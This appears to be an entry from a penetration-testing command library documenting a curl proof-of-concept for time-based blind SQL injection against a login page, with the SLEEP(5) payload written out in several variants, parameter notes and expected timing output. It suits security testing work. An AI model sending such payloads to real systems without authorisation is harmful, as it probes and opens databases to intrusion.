---
id: cmd-uuid-1
data: >-
  curl -X POST https://target.com/olc/setlogin.php -d
  "username=admin'+(select*from(select(sleep(5)))a)+'&password=pass" -v
tags:
  - sqli
  - poc
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.021Z'
verified: false
validated: true
submitted: true
---
# curl-manual-sqli-poc

## Command

```bash
curl -X POST https://target.com/olc/setlogin.php -d "username=admin'+(select*from(select(sleep(5)))a)+'&password=pass" -v
```

## Description

This command sends a manual POST request to test for time-based blind SQL injection by injecting a MySQL SLEEP(5) payload into the username field, observing a delay in response to confirm vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-d` | Data payload for POST | Yes |
| `-v` | Verbose output for timing observation | Yes |
| URL | Target endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/olc/setlogin.php -d "username=admin'+(select*from(select(sleep(5)))a)+'&password=pass" -v
```

### Advanced Usage

```bash
curl -X POST https://target.com/olc/setlogin.php -d "username=admin'+(select*from(select(sleep(5)))a)+'&password=pass" -v -w "%{time_total}\n"
```

## Expected Output

Verbose HTTP response with a total execution time of approximately 5 seconds longer than a normal request, indicating successful injection without explicit errors.

## Related

- [[Related Procedure: Manual-Time-Based-SQLi-Verification]]
